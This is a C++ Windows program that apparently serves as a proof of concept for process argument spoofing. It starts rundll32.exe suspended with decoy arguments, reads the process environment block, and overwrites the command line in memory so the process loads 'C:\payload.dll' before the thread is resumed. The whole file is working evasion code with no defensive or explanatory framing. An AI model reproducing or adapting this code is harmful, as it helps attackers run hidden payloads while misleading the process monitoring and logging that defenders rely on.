
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <malloc.h>

#pragma comment(lib, "ntdll")

int main()
{
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    PROCESSINFOCLASS pic = (PROCESSINFOCLASS)0;
    ULONG ReturnLength;
    LPVOID process_parameters = 0;
    UNICODE_STRING command_line = { 0 };
    RTL_USER_PROCESS_PARAMETERS user_process_parameters = { 0 };
    PPEB peb;
    si.cb = sizeof(STARTUPINFOW);

    if (CreateProcessW(L"C:\\windows\\system32\\rundll32.exe", (LPWSTR)L"C:\\windows\\system32\\rundll32.exe These are my argu", nullptr, nullptr, false, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {

        LPCWSTR spoofed_args = L"This is my spoofed arguments";
        size_t arg_len = wcslen(spoofed_args) * sizeof(WCHAR);

        if (NtQueryInformationProcess(pi.hProcess, pic, &pbi, sizeof(pbi), &ReturnLength) == 0) {

            printf("peb base addr: %p\n", pbi.PebBaseAddress);

            if (ReadProcessMemory(pi.hProcess, (LPCVOID)((unsigned char*)pbi.PebBaseAddress + 0x20), &process_parameters, 0x8, nullptr)) {

                printf("process parameters offset: %I64x, %I64x\n", process_parameters, &process_parameters);

                if (ReadProcessMemory(pi.hProcess, (LPCVOID)((unsigned char*)process_parameters + 0x70), &command_line, sizeof(UNICODE_STRING), nullptr)) {

                    wchar_t* buffer = (wchar_t*)malloc(command_line.Length * sizeof(wchar_t*));

                    if (ReadProcessMemory(pi.hProcess, (LPCVOID)command_line.Buffer, buffer, command_line.Length, nullptr)) {

                        wchar_t new_buffer[] = L"C:\\windows\\system32\\rundll32.exe C:\\payload.dll,#1";
                        size_t buff_len = wcslen(new_buffer) * sizeof(WCHAR);

                        printf("buffer addr: %I64x\n", command_line.Buffer);

                        if (WriteProcessMemory(pi.hProcess, command_line.Buffer, new_buffer, buff_len, nullptr)) {
                            printf("changing command line arguments success\n");
                            ResumeThread(pi.hThread);
                            getchar();
                        }
                    }
                }
                else {
                    printf("could not read command line address: (0x%08x)\n", GetLastError());
                }
            }
            else {
                printf("could not read process memory: (0x%08x)\n", GetLastError());
            }
        }
        else {
            printf("could not get process information\n");
        }
    }
    else {
        printf("could not create process: (0x%08x)\n", GetLastError());
        WaitForSingleObject(pi.hProcess, INFINITE);
    }

    return 0;

}
